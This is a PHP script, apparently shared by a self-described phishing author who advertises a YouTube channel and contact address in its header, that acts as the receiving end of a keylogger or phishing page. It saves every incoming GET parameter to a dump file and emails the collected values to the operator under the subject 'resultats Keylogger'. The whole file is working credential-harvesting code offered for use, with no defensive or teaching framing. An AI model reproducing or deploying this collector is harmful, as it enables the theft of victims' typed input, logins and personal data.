<?php
/*                                                                                                         
####################################################################
# s'abonner sur ma chaine youtube pour avoir plus de code phishing #
# et hacking,il me donne le courage de faire les codes phishing    #                                                                              
#                                                                  #
# subscribe on my youtube channel to have more phishing code       #
# and hacking, it gives me the courage to do the phishing codes    #
#                                                                  #
#             ||~~ BY ~~ hakanonymos ~~||                          #
#                                                                  #
#                https://www.youtube.com/watch?v=WbjEBn_970U       #
#                                                                  #
#    skype et email : hakanonymos@hotmail.com                      #                                                                 
####################################################################                                                                                                    
*/

$fichier = fopen('dump.txt', 'r+' );
 file_put_contents('dump.txt' , print_r($_GET, true));
 fclose($fichier);

$headers = 'MIME-Version: 1.0' . "\r\n"; 
 
$headers .= 'To: YOUR EMAIL ' . "\r\n";//ici vous mettez votre adresse email gmail ou hotmail ...etc 

$headers .= 'From: your website ' . "\r\n";//ici vous metez ton site web ou une boite de votre site web

$headers .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
$headers .= 'Content-Transfer-Encoding: 8bit' . "\r\n";
$subject = "resultats Keylogger";
$message = "";
while (list($key, $val) = each($_GET)) {if(!empty($val)) {$message .= "$key : $val\n";}}
mail($TO, $subject, $message, $headers);
 

 ?>
